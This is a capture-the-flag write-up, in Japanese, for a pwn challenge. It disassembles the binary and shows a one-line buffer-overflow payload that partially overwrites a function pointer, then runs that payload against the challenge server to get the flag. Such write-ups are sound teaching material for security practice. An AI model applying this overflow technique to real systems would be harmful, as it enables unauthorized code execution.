# The road not taken:pwn:50pts
Show me the right path to reach my final destination  
`nc 34.100.142.216 1337`  

[road_not_taken.zip](road_not_taken.zip)  

# Solution
接続先とバイナリが渡される。  
```bash
$ ./the_road_not_taken1
Can you please lead me to the right direction to get to the flag?
satoki
This doesn't look like the right direction are u sure
$ checksec --file=./the_road_not_taken1 --format=csv
Partial RELRO,No Canary found,NX enabled,PIE enabled,No RPATH,No RUNPATH,Symbols,No,0,1,./the_road_not_taken1
```
いろいろとついている。  
```bash
$ objdump -D ./the_road_not_taken1
~~~
0000000000001159 <rightdirection>:
    1159:       55                      push   %rbp
    115a:       48 89 e5                mov    %rsp,%rbp
    115d:       48 8d 05 a4 0e 00 00    lea    0xea4(%rip),%rax        # 2008 <_IO_stdin_used+0x8>
    1164:       48 89 c7                mov    %rax,%rdi
    1167:       e8 c4 fe ff ff          call   1030 <puts@plt>
    116c:       48 8d 05 a9 0e 00 00    lea    0xea9(%rip),%rax        # 201c <_IO_stdin_used+0x1c>
    1173:       48 89 c7                mov    %rax,%rdi
    1176:       e8 b5 fe ff ff          call   1030 <puts@plt>
    117b:       90                      nop
    117c:       5d                      pop    %rbp
    117d:       c3                      ret

000000000000117e <wrongdirection>:
    117e:       55                      push   %rbp
    117f:       48 89 e5                mov    %rsp,%rbp
    1182:       48 8d 05 af 0e 00 00    lea    0xeaf(%rip),%rax        # 2038 <_IO_stdin_used+0x38>
    1189:       48 89 c7                mov    %rax,%rdi
    118c:       e8 9f fe ff ff          call   1030 <puts@plt>
    1191:       90                      nop
    1192:       5d                      pop    %rbp
    1193:       c3                      ret

0000000000001194 <main>:
    1194:       55                      push   %rbp
    1195:       48 89 e5                mov    %rsp,%rbp
    1198:       48 81 ec 10 02 00 00    sub    $0x210,%rsp
    119f:       48 8b 05 8a 2e 00 00    mov    0x2e8a(%rip),%rax        # 4030 <stdout@GLIBC_2.2.5>
    11a6:       be 00 00 00 00          mov    $0x0,%esi
    11ab:       48 89 c7                mov    %rax,%rdi
    11ae:       e8 8d fe ff ff          call   1040 <setbuf@plt>
    11b3:       48 8b 05 86 2e 00 00    mov    0x2e86(%rip),%rax        # 4040 <stdin@GLIBC_2.2.5>
    11ba:       be 00 00 00 00          mov    $0x0,%esi
    11bf:       48 89 c7                mov    %rax,%rdi
    11c2:       e8 79 fe ff ff          call   1040 <setbuf@plt>
    11c7:       48 8d 05 b0 ff ff ff    lea    -0x50(%rip),%rax        # 117e <wrongdirection>
    11ce:       48 89 45 f8             mov    %rax,-0x8(%rbp)
    11d2:       48 8d 05 97 0e 00 00    lea    0xe97(%rip),%rax        # 2070 <_IO_stdin_used+0x70>
    11d9:       48 89 c7                mov    %rax,%rdi
    11dc:       e8 4f fe ff ff          call   1030 <puts@plt>
    11e1:       48 8d 85 f0 fd ff ff    lea    -0x210(%rbp),%rax
    11e8:       ba 0a 02 00 00          mov    $0x20a,%edx
    11ed:       48 89 c6                mov    %rax,%rsi
    11f0:       bf 00 00 00 00          mov    $0x0,%edi
    11f5:       e8 56 fe ff ff          call   1050 <read@plt>
    11fa:       48 8b 55 f8             mov    -0x8(%rbp),%rdx
    11fe:       b8 00 00 00 00          mov    $0x0,%eax
    1203:       ff d2                   call   *%rdx
    1205:       90                      nop
    1206:       c9                      leave
    1207:       c3                      ret

~~~
```
`rightdirection`があるのでBOFでそこへ飛ばせばよいようだ。  
オフセットを適度に計算し、アドレス末尾を`\x59`(`Y`)に書き換えてやればよい。  
```bash
$ python -c 'print("Y" * 521, end="")' | ./the_road_not_taken1
Can you please lead me to the right direction to get to the flag?
Thanks for the help
nite{not_the_real_flag}
$ python -c 'print("Y" * 521, end="")' | nc 34.100.142.216 1337
Can you please lead me to the right direction to get to the flag?
Thanks for the help
nite{R0b3rT_fro5t_ftw_32dx5hp}
```
flagが得られた。  

## nite{R0b3rT_fro5t_ftw_32dx5hp}